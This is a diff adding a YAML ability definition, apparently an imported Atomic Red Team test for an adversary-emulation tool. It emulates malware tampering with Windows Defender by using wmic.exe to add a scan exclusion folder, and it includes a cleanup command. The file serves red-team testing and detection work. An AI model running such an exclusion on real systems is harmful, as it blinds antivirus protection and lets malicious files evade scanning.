@@ -1,0 +1,32 @@
+- id: 59d386fc-3a4b-41b8-850d-9e3eee24dfe4
+  name: WMIC Tamper with Windows Defender Evade Scanning Folder
+  description: 'The following Atomic will attempt to exclude a folder within Defender
+    leveraging WMI
+
+    Reference: https://www.bleepingcomputer.com/news/security/gootkit-malware-bypasses-windows-defender-by-setting-path-exclusions/'
+  tactic: defense-impairment
+  technique:
+    attack_id: T1685
+    name: Disable or Modify Tools
+  platforms:
+    windows:
+      sh:
+        command: wmic.exe /Namespace:\\root\Microsoft\Windows\Defender class MSFT_MpPreference
+          call Add ExclusionPath=\"ATOMICREDTEAM\"
+        cleanup: wmic.exe /Namespace:\\root\Microsoft\Windows\Defender class MSFT_MpPreference
+          call Remove ExclusionPath=\"ATOMICREDTEAM\"
+        elevation_required: true
+  plugin: atomic
+  singleton: false
+  repeatable: true
+  delete_payload: false
+  privilege: ''
+  buckets:
+  - atomic-red-team
+  - t1685
+  - defense-impairment
+  author: Atomic Red Team
+  additional_info:
+    technique_created: '2026-04-14T22:53:26.949Z'
+    atomic_guid: 59d386fc-3a4b-41b8-850d-9e3eee24dfe4
+    import_timestamp: '2026-05-02T05:00:41.600115Z'
